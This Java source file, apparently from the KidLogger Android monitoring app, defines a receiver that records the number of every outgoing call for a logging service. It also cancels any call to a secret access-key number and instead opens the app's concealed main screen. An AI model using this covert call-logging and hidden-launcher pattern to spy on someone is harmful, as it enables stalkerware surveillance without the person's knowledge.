package net.kidlogger.kidlogger;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class OutCallReceiver extends BroadcastReceiver {

	public void onReceive(Context context, Intent intent) {
		if(context == null || intent == null)
			return;
		
		String action = intent.getAction();
		if(action == null)
			return;
		
		if(action.equals(Intent.ACTION_NEW_OUTGOING_CALL)){			
			String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
			if(number == null)
				number = "undefined";			
			
			TApplication app = (TApplication)context.getApplicationContext();
						
			if(number.equals(app.mAccessKey)){
				setResultData(null);				
				app.launchMainActivity();
			}				
			
			if(app.mService != null)
				app.mService.runCallEvent(CallsReceiver.NEW_CALL, new String(number), false);
			
			//Intent outCall = new Intent(KLService.OUTGOING_CALL);
			//outCall.putExtra("number", new String(number));
			//context.sendBroadcast(outCall);
		}
	}
}
